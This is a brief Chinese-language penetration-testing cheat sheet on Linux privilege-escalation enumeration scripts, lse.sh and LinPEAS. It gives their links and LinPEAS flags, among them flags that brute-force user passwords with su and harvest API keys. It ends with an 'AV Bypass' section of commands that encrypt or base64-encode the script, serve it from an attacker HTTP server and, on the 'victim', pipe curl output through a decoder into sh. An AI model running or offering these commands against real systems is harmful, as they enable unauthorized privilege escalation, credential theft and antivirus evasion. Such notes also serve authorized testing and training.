...............................
# lse.sh
Link: (https://github.com/diego-treitos/linux-smart-enumeration)
Usage: 直接上传执行
For: Linux
...............................
# LinPEAS
Link:https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
For: linux权限提升建议脚本
Usage: 直接上传执行，没有依赖项。
Parameters: 
``` 
    -a（除正则表达式外的所有检查） - 这也将在 1 分钟内执行进程检查，将在文件中搜索更多可能的哈希值，并使用带有 top2000 密码的 `su` 暴力破解每个用户。 
    -e （extra enumeration） - 这将执行默认情况下避免的枚举检查  
    -r （regex checks） - 这将在文件系统中搜索数百个不同平台的 API 密钥
    -s （superfast & stealth） - 这将绕过一些耗时的检查 - 隐身模式（不会将任何内容写入磁盘）
    -P （Password） - 传递将用于 `sudo -l` 和暴力破解其他用户的密码
    -D （Debug） - 打印有关未发现任何内容的检查以及每次检查所花费时间的信息 
    -d/-p/-i/-t （本地网络枚举） - Linpeas 还可以发现和端口扫描本地网络
```
AV Bypass:
```
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

